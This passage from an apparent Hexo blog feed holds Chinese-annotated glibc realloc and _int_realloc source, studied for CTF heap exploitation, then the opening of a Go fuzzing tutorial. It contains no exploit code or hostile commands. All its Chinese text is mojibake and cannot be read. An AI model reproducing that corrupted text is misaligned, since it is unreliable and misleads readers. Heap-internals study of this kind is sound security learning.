è·å– oldmem å¯¹åº”çš„ chunk çš„æŒ‡é’ˆå’Œå¤§å°</span><br>  <span class="hljs-comment">/* chunk corresponding to oldmem */</span><br>  <span class="hljs-type">const</span> mchunkptr oldp = mem2chunk (oldmem);<br>  <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);<br>  <span class="hljs-comment">// å¯»æ‰¾ oldp å¯¹åº”çš„ arena</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (oldp))<br>    ar_ptr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">else</span><br>    ar_ptr = arena_for_chunk (oldp);<br> <br>  <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">     allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">     Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">     here by accident or by &quot;design&quot; from some intruder.  */</span><br>  <span class="hljs-comment">// æ£€æŸ¥ oldp + oldsize æ˜¯å¦è¶…è¿‡åœ°å€ä¸Šé™</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) oldp &gt; (<span class="hljs-type">uintptr_t</span>) -oldsize, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (oldp), <span class="hljs-number">0</span>))<br>    &#123;<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;realloc(): invalid pointer&quot;</span>, oldmem,<br>               ar_ptr);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  <span class="hljs-comment">// æ£€æŸ¥å¦‚æœç”³è¯·æœ€å°çš„ chunk æ˜¯å¦ä¼šè¶…è¿‡åœ°å€ä¸Šé™</span><br>  checked_request2size (bytes, nb);<br> <br>  <span class="hljs-comment">// å¦‚æœæ˜¯ mmap å¾—åˆ°çš„å†…å­˜ä¼šå•ç‹¬å¤„ç†</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (oldp))<br>    &#123;<br>      <span class="hljs-type">void</span> *newmem;<br> <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> HAVE_MREMAP</span><br>      <span class="hljs-comment">// å¦‚æœæ˜¯ mmap å¾—åˆ°çš„å†…å­˜åˆ™åˆ©ç”¨ mremap ç³»ç»Ÿè°ƒç”¨å®ç° reallocã€‚</span><br>      <span class="hljs-comment">// mremap ä¼šé‡æ–°åˆ†é…ä¸€å—å†…å­˜å¹¶å°†ä¹‹å‰çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„å†…å­˜ä¸Šã€‚</span><br>      newp = mremap_chunk (oldp, nb);<br>      <span class="hljs-keyword">if</span> (newp)<br>        <span class="hljs-keyword">return</span> chunk2mem (newp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-comment">/* Note the extra SIZE_SZ overhead. */</span><br>      <span class="hljs-keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)<br>        <span class="hljs-keyword">return</span> oldmem;                         <span class="hljs-comment">/* do nothing */</span><br> <br>      <span class="hljs-comment">/* Must alloc, copy, free. */</span><br>      <span class="hljs-comment">// å¦‚æœ mremap è·å–ä¸åˆ°æ‰€éœ€çš„å†…å­˜åˆ™é€šè¿‡ malloc è·å–å†…å­˜ï¼Œå¹¶å°†åŸå…ˆå†…å­˜çš„æ•°æ®å¤åˆ¶è¿‡æ¥ç„¶å munmap å°†åŸå…ˆçš„å†…å­˜é‡Šæ”¾æ‰</span><br>      newmem = __libc_malloc (bytes);<br>      <span class="hljs-keyword">if</span> (newmem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;              <span class="hljs-comment">/* propagate failure */</span><br> <br>      <span class="hljs-built_in">memcpy</span> (newmem, oldmem, oldsize - <span class="hljs-number">2</span> * SIZE_SZ);<br>      munmap_chunk (oldp);<br>      <span class="hljs-keyword">return</span> newmem;<br>    &#125;<br> <br>  (<span class="hljs-type">void</span>) mutex_lock (&amp;ar_ptr-&gt;mutex);<br> <br>  <span class="hljs-comment">// è°ƒç”¨ _int_realloc è°ƒæ•´å†…å­˜</span><br>  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);<br> <br>  (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">// æ£€æŸ¥å†…å­˜åˆ†é…åçš„ 3 ç§æƒ…å†µ</span><br>  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (newp)));<br> <br>  <span class="hljs-comment">// å¦‚æœ _int_realloc æ²¡æœ‰æˆåŠŸåˆ™å°è¯•è°ƒç”¨ _int_malloc é‡æ–°åˆ†é…å†…å­˜</span><br>  <span class="hljs-keyword">if</span> (newp == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Try harder to allocate memory in other arenas.  */</span><br>      LIBC_PROBE (memory_realloc_retry, <span class="hljs-number">2</span>, bytes, oldmem);<br>      newp = __libc_malloc (bytes);<br>      <span class="hljs-comment">// å¦‚æœ malloc æˆåŠŸåˆ™å°†æ•°æ®æ‹·è´åé‡Šæ”¾åŸå…ˆçš„å†…å­˜</span><br>      <span class="hljs-keyword">if</span> (newp != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);<br>          _int_free (ar_ptr, oldp, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br> <br>  <span class="hljs-keyword">return</span> newp;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="int-realloc"><a href="#int-realloc" class="headerlink" title="int_realloc"></a><code>int_realloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// _int_reallocå‡½æ•°ç”¨äºé‡æ–°åˆ†é…å†…å­˜å—ã€‚å®ƒå°è¯•æ›´æ”¹å†…å­˜å—çš„å¤§å°å¹¶å¯èƒ½ç§»åŠ¨å®ƒä»¥æ»¡è¶³æ–°çš„å¤§å°è¦æ±‚ã€‚</span><br><span class="hljs-comment">// å‚æ•°:</span><br><span class="hljs-comment">// av - æŒ‡å‘å†…å­˜çŠ¶æ€çš„æŒ‡é’ˆã€‚</span><br><span class="hljs-comment">// oldp - æŒ‡å‘å½“å‰å†…å­˜å—çš„æŒ‡é’ˆã€‚</span><br><span class="hljs-comment">// oldsize - å½“å‰å†…å­˜å—çš„å¤§å°ã€‚</span><br><span class="hljs-comment">// nb - è¯·æ±‚çš„æ–°å¤§å°ã€‚</span><br><span class="hljs-type">void</span>* _int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb) &#123;<br>  <span class="hljs-comment">// å®šä¹‰ä¸€ç³»åˆ—å±€éƒ¨å˜é‡æ¥å­˜å‚¨åˆ†é…çš„çŠ¶æ€å’Œä¸­é—´ç»“æœã€‚</span><br>  mchunkptr newp; <span class="hljs-comment">// æ–°åˆ†é…çš„å†…å­˜å—æŒ‡é’ˆã€‚</span><br>  INTERNAL_SIZE_T newsize; <span class="hljs-comment">// æ–°å†…å­˜å—çš„å¤§å°ã€‚</span><br>  <span class="hljs-type">void</span>* newmem; <span class="hljs-comment">// å¯¹åº”ç”¨æˆ·å†…å­˜çš„æŒ‡é’ˆã€‚</span><br> <br>  mchunkptr next; <span class="hljs-comment">// æŒ‡å‘oldpåé¢çš„è¿ç»­å†…å­˜å—ã€‚</span><br> <br>  mchunkptr remainder; <span class="hljs-comment">// æ–°åˆ†é…å†…å­˜åå‰©ä½™çš„å†…å­˜å—ã€‚</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size; <span class="hljs-comment">// å‰©ä½™å†…å­˜å—çš„å¤§å°ã€‚</span><br> <br>  mchunkptr bck; <span class="hljs-comment">// ç”¨äºé“¾æ¥çš„ä¸´æ—¶å˜é‡ã€‚</span><br>  mchunkptr fwd; <span class="hljs-comment">// ç”¨äºé“¾æ¥çš„ä¸´æ—¶å˜é‡ã€‚</span><br> <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> copysize; <span class="hljs-comment">// éœ€è¦å¤åˆ¶çš„å­—èŠ‚æ•°ã€‚</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ncopies; <span class="hljs-comment">// éœ€è¦å¤åˆ¶çš„INTERNAL_SIZE_Tå­—æ•°ã€‚</span><br>  INTERNAL_SIZE_T* s; <span class="hljs-comment">// å¤åˆ¶æºçš„æŒ‡é’ˆã€‚</span><br>  INTERNAL_SIZE_T* d; <span class="hljs-comment">// å¤åˆ¶ç›®æ ‡çš„æŒ‡é’ˆã€‚</span><br> <br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// ç”¨äºé”™è¯¯å¤„ç†çš„å­—ç¬¦ä¸²ã€‚</span><br> <br>  <span class="hljs-comment">// æ£€æŸ¥oldpçš„å¤§å°æ˜¯å¦åˆæ³•ã€‚</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect(oldp-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect(oldsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;realloc(): invalid old size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br> <br>  check_inuse_chunk(av, oldp); <span class="hljs-comment">// æ£€æŸ¥oldpæ˜¯å¦æ­£åœ¨ä½¿ç”¨ä¸­ã€‚</span><br> <br>  assert(!chunk_is_mmapped(oldp)); <span class="hljs-comment">// ç¡®ä¿oldpä¸æ˜¯æ˜ å°„å†…å­˜ã€‚</span><br> <br>  next = chunk_at_offset(oldp, oldsize); <span class="hljs-comment">// è®¡ç®—ä¸‹ä¸€ä¸ªå†…å­˜å—çš„ä½ç½®ã€‚</span><br>  INTERNAL_SIZE_T nextsize = chunksize(next); <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ªå†…å­˜å—çš„å¤§å°ã€‚</span><br>  <span class="hljs-comment">// æ£€æŸ¥ä¸‹ä¸€ä¸ªå†…å­˜å—çš„å¤§å°æ˜¯å¦åˆæ³•ã€‚</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect(next-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>    errstr = <span class="hljs-string">&quot;realloc(): invalid next size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br> <br>  <span class="hljs-comment">// å¦‚æœå½“å‰å†…å­˜å—å·²ç»è¶³å¤Ÿå¤§ï¼Œåˆ™ç›´æ¥è¿”å›å½“å‰å†…å­˜å—ã€‚</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(oldsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb)) &#123;<br>    newp = oldp;<br>    newsize = oldsize;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ªå†…å­˜å—æ˜¯ top chunk ï¼Œå¹¶ä¸”å¯ä»¥åˆå¹¶ä»¥æ»¡è¶³è¯·æ±‚çš„å¤§å°ï¼Œåˆ™è¿›è¡Œåˆå¹¶ã€‚</span><br>    <span class="hljs-keyword">if</span> (next == av-&gt;top &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb + MINSIZE)) &#123;<br>      set_head_size(oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      av-&gt;top = chunk_at_offset(oldp, nb);<br>      set_head(av-&gt;top, (newsize - nb) | PREV_INUSE);<br>      check_inuse_chunk(av, oldp);<br>      <span class="hljs-keyword">return</span> chunk2mem(oldp);<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ªå†…å­˜å—ä¸åœ¨ä½¿ç”¨ä¸­ï¼Œå¹¶ä¸”å¯ä»¥åˆå¹¶ä»¥æ»¡è¶³è¯·æ±‚çš„å¤§å°ï¼Œåˆ™è¿›è¡Œåˆå¹¶ã€‚</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (next != av-&gt;top &amp;&amp; !inuse(next) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb)) &#123;<br>      newp = oldp;<br>      unlink(av, next, bck, fwd);<br>    &#125;<br>    <span class="hljs-comment">// å¦åˆ™ï¼Œåˆ†é…æ–°å†…å­˜ï¼Œå¤åˆ¶æ•°æ®ï¼Œç„¶åé‡Šæ”¾æ—§å†…å­˜ã€‚</span><br>    <span class="hljs-keyword">else</span> &#123;<br>      newmem = _int_malloc(av, nb - MALLOC_ALIGN_MASK);<br>      <span class="hljs-keyword">if</span> (newmem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// å¦‚æœåˆ†é…å¤±è´¥ï¼Œåˆ™è¿”å›0ã€‚</span><br> <br>      newp = mem2chunk(newmem);<br>      newsize = chunksize(newp);<br> <br>      <span class="hljs-comment">// å¦‚æœæ–°åˆ†é…çš„å†…å­˜å—ç´§è·Ÿåœ¨æ—§å†…å­˜å—åé¢ï¼Œåˆ™åˆå¹¶è¿™ä¸¤ä¸ªå†…å­˜å—ã€‚</span><br>      <span class="hljs-keyword">if</span> (newp == next) &#123;<br>        newsize += oldsize;<br>        newp = oldp;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¦åˆ™ï¼Œå¤åˆ¶æ—§å†…å­˜å—çš„å†…å®¹åˆ°æ–°å†…å­˜å—ã€‚</span><br>        copysize = oldsize - SIZE_SZ;<br>        s = (INTERNAL_SIZE_T*)(chunk2mem(oldp));<br>        d = (INTERNAL_SIZE_T*)(newmem);<br>        ncopies = copysize / <span class="hljs-keyword">sizeof</span>(INTERNAL_SIZE_T);<br>        assert(ncopies &gt;= <span class="hljs-number">3</span>);<br> <br>        <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">9</span>)<br>          <span class="hljs-built_in">memcpy</span>(d, s, copysize);<br>        <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// å¯¹äºå°å†…å­˜å—ï¼Œä½¿ç”¨æ‰‹åŠ¨å¤åˆ¶ä»¥æé«˜æ•ˆç‡ã€‚</span><br>          *(d + <span class="hljs-number">0</span>) = *(s + <span class="hljs-number">0</span>);<br>          *(d + <span class="hljs-number">1</span>) = *(s + <span class="hljs-number">1</span>);<br>          *(d + <span class="hljs-number">2</span>) = *(s + <span class="hljs-number">2</span>);<br>          <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">4</span>) &#123;<br>            *(d + <span class="hljs-number">3</span>) = *(s + <span class="hljs-number">3</span>);<br>            *(d + <span class="hljs-number">4</span>) = *(s + <span class="hljs-number">4</span>);<br>            <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">6</span>) &#123;<br>              *(d + <span class="hljs-number">5</span>) = *(s + <span class="hljs-number">5</span>);<br>              *(d + <span class="hljs-number">6</span>) = *(s + <span class="hljs-number">6</span>);<br>              <span class="hljs-keyword">if</span> (ncopies &gt; <span class="hljs-number">8</span>) &#123;<br>                *(d + <span class="hljs-number">7</span>) = *(s + <span class="hljs-number">7</span>);<br>                *(d + <span class="hljs-number">8</span>) = *(s + <span class="hljs-number">8</span>);<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br> <br>        _int_free(av, oldp, <span class="hljs-number">1</span>); <span class="hljs-comment">// é‡Šæ”¾æ—§å†…å­˜å—ã€‚</span><br>        check_inuse_chunk(av, newp); <span class="hljs-comment">// æ£€æŸ¥æ–°å†…å­˜å—æ˜¯å¦æ­£åœ¨ä½¿ç”¨ä¸­ã€‚</span><br>        <span class="hljs-keyword">return</span> chunk2mem(newp); <span class="hljs-comment">// è¿”å›æ–°å†…å­˜å—çš„ç”¨æˆ·å¯ç”¨éƒ¨åˆ†ã€‚</span><br>      &#125;<br>    &#125;<br>  &#125;<br> <br>  <span class="hljs-comment">// å°è¯•é‡Šæ”¾æ–°å†…å­˜å—ä¸­çš„å¤šä½™ç©ºé—´ã€‚</span><br>  assert((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(newsize) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb));<br>  remainder_size = newsize - nb;<br>  <span class="hljs-comment">// å¦‚æœå‰©ä½™ç©ºé—´å¤ªå°ï¼Œæ— æ³•åˆ†å‰²ä¸ºç‹¬ç«‹çš„å†…å­˜å—ï¼Œåˆ™ä¿ç•™å®ƒã€‚</span><br>  <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE) &#123;<br>    set_head_size(newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_inuse_bit_at_offset(newp, newsize);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// å¦åˆ™ï¼Œåˆ†å‰²å‰©ä½™ç©ºé—´ä¸ºç‹¬ç«‹çš„å†…å­˜å—ã€‚</span><br>    remainder = chunk_at_offset(newp, nb);<br>    set_head_size(newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_inuse_bit_at_offset(remainder, remainder_size); <span class="hljs-comment">// æ ‡è®°å‰©ä½™éƒ¨åˆ†ä¸ºæ­£åœ¨ä½¿ç”¨ä¸­ï¼Œä»¥ä¾¿_free()ä¸ä¼šæŠ¥é”™ã€‚</span><br>    _int_free(av, remainder, <span class="hljs-number">1</span>); <span class="hljs-comment">// é‡Šæ”¾å‰©ä½™éƒ¨åˆ†ã€‚</span><br>  &#125;<br> <br>  check_inuse_chunk(av, newp); <span class="hljs-comment">// æ£€æŸ¥æ–°å†…å­˜å—æ˜¯å¦æ­£åœ¨ä½¿ç”¨ä¸­ã€‚</span><br>  <span class="hljs-keyword">return</span> chunk2mem(newp); <span class="hljs-comment">// è¿”å›æ–°å†…å­˜å—çš„ç”¨æˆ·å¯ç”¨éƒ¨åˆ†ã€‚</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p>å‚è€ƒï¼šptmallocå†…å­˜ç®¡ç†åˆ†æ<br>å‚è€ƒï¼šçœ‹é›ªpwnæ¢ç´¢ç¯‡<br>å‚è€ƒï¼š<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc â€“ sploitF-U-N</a><br>å‚è€ƒï¼š<a href="https://a1ex.online/2020/09/28/glibc-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#%E9%87%8D%E8%A6%81%E5%87%BD%E6%95%B0-1">glibc-mallocæºç åˆ†æ | A1exâ€™s Blog</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILEåˆ©ç”¨å…¥é—¨</title>
      <link href="/2025/07/01/ctf/heap/io-file/"/>
      <url>/2025/07/01/ctf/heap/io-file/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go Fuzz</title>
      <link href="/2025/07/01/fuzz/go-fuzz/"/>
      <url>/2025/07/01/fuzz/go-fuzz/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ä¼ ç»Ÿçš„ AFLã€libFuzzer å’Œ honggfuzz ä¸»è¦æ”¯æŒç”¨ C&#x2F;C++ è¯­è¨€å¼€å‘çš„é¡¹ç›®ã€‚ä½†æ˜¯ç°åœ¨éšç€ Rustã€Go ç­‰æ–°å…´ç¼–è¯‘å‹è¯­è¨€çš„å…´èµ·ï¼Œç›¸åº”çš„å‡ºç°äº†å¯¹è¿™äº›è¯­è¨€å¼€å‘çš„é¡¹ç›®è¿›è¡Œ Fuzz çš„éœ€æ±‚ã€‚å› æ­¤ï¼Œäººä»¬åœ¨åŸºäºä¼ ç»Ÿçš„ Fuzz æ€æƒ³çš„åŸºç¡€ä¸Šï¼Œé€æ­¥ä¸ºè¿™äº›è¯­è¨€æ„å»ºäº†ä¸“é—¨çš„ Fuzz å·¥å…·ã€‚æœ¬æ–‡æ‰€è¦å­¦ä¹ çš„ cargo-fuzz å’Œ afl.rs æ­£æ˜¯å¦‚æ­¤ã€‚</p><p>å¯¹ Go ç¨‹åºçš„ Fuzz å·¥å…·æœ‰å®˜æ–¹æä¾›çš„<code>go test -fuzz</code>å’Œç¬¬ä¸‰æ–¹çš„<code>go-fuzz</code>ã€‚</p><p>Goå®˜æ–¹å›¢é˜Ÿçš„Fuzzingå®ç°å€Ÿé‰´äº†go-fuzzçš„è®¾è®¡æ€æƒ³ã€‚</p><p>Go 1.18æŠŠFuzzingæ•´åˆåˆ°äº†<code>go test</code>å·¥å…·é“¾å’Œ<code>testing</code>åŒ…é‡Œã€‚</p><p>go-fuzz åŸºäº AFL&#x2F;libFuzzerçš„å˜å¼‚ç­–ç•¥ï¼Œè€Œ go test ä½¿ç”¨çš„æ˜¯è‡ªç ”çš„å˜å¼‚ç®—æ³•ã€‚</p><p>Go-fuzz æ˜¯ä¸€ä¸ªç”¨äºGoè¯­è¨€åŒ…çš„è¦†ç›–ç‡å¼•å¯¼æ¨¡ç³Šæµ‹è¯•è§£å†³æ–¹æ¡ˆã€‚å®ƒä¸»è¦ç”¨äºæµ‹è¯•å¤„ç†å¤æ‚è¾“å…¥ï¼ˆæ–‡æœ¬æˆ–äºŒè¿›åˆ¶ï¼‰çš„åŒ…ï¼Œç‰¹åˆ«é€‚åˆå¼ºåŒ–å¤„ç†æ½œåœ¨æ¶æ„ç”¨æˆ·è¾“å…¥çš„ç³»ç»Ÿï¼ˆå¦‚ç½‘ç»œæœåŠ¡ï¼‰ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•çš„ç¤ºä¾‹ï¼Œçªå‡ºæ˜¾ç¤ºäº†å…¶ä¸»è¦çš„ç»„ä»¶ã€‚</p><p><img src="/Linux/assets/Pasted%20image%2020250531230716.png"></p><h2 id="å®˜æ–¹Fuzz"><a href="#å®˜æ–¹Fuzz" class="headerlink" title="å®˜æ–¹Fuzz"></a>å®˜æ–¹Fuzz</h2><p>å’Œ go-fuzz ä¸åŒï¼Œgo test fuzz æ˜¯å®˜æ–¹ test å·¥å…·çš„é›†æˆã€‚ä¹Ÿæœ‰å¾ˆå¤šåœ°æ–¹å‚è€ƒäº† go-fuzzã€‚</p><h3 id="å‰æœŸå·¥ä½œ"><a href="#å‰æœŸå·¥ä½œ" class="headerlink" title="å‰æœŸå·¥ä½œ"></a>å‰æœŸå·¥ä½œ</h3><p>åˆ›å»ºä¸€ä¸ªä»¥<code>_test.go</code>ç»“å°¾çš„æµ‹è¯•æ–‡ä»¶ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// å®˜æ–¹æ¨¡ç³Šæµ‹è¯•ç¤ºä¾‹</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FuzzParseURL</span><span class="hljs-params">(f *testing.F)</span></span> &#123;<br>    f.Add(<span class="hljs-string">&quot;https://example.com&quot;</span>) <span class="hljs-comment">// ç§å­è¾“å…¥</span><br>    f.Fuzz(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T, s <span class="hljs-type">string</span>)</span></span> &#123;<br>        <span class="hljs-keyword">if</span> _, err := url.Parse(s); err != <span class="hljs-literal">nil</span> &#123;<br>            t.Skip() <span class="hljs-comment">// å¿½ç•¥æ— æ•ˆè¾“å…¥</span><br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ– Go æ¨¡å—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir fuzz_test<br><br>go mod init fuzz_test     <br></code></pre></td></tr></table></figure><p>æ¨¡ç³Šæµ‹è¯•å¿…é¡»éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š</p><ol><li>æµ‹è¯•å‡½æ•°å¿…é¡»å‘½åä¸º<code>FuzzXxx</code>æ ¼å¼ï¼Œä»…æ¥å—<code>*testing.F</code>å‚æ•°ï¼Œæ— è¿”å›å€¼</li><li>æ¨¡ç³Šæµ‹è¯•å¿…é¡»ä½äº<code>*_test.go</code>æ–‡ä»¶ä¸­æ‰èƒ½æ‰§è¡Œ</li><li>æ¨¡ç³Šç›®æ ‡å¿…é¡»æ˜¯é€šè¿‡<code>(*testing.F).Fuzz</code>è°ƒç”¨çš„æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸º<code>*testing.T</code>ï¼Œåæ¥æ¨¡ç³Šå‚æ•°ï¼Œæ— è¿”å›å€¼</li><li>æ¯ä¸ªæ¨¡ç³Šæµ‹è¯•åªèƒ½æœ‰ä¸€ä¸ªæ¨¡ç³Šç›®æ 